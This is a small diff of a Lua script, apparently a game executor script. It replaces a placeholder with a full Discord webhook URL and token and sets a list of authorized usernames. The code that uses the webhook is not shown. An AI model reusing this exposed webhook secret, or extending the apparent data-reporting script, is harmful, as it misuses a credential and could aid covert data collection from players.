@@ -11,7 +11,7 @@ if env.already_executed then return end
 env.already_executed = true
 
 -- ===================== YOUR SETUP =====================
-local YOUR_DISCORD_WEBHOOK = "YOUR_DISCORD_WEBHOOK_HERE" -- ← PASTE YOUR WEBHOOK HERE
+local YOUR_DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1543244647462080623/5JzL3T30KbyJunUmcCCcn2P6mHRlOJPaJhqA1OZ35rLzmRg9iaffDugI3hvQuVd4J0os" -- ← PASTE YOUR WEBHOOK HERE
 local AUTHORIZED_USERS = {"JAMAL_THESCRIPTGUY", "ingenious_reciever", "temphorious"}
 -- ========================================================
 
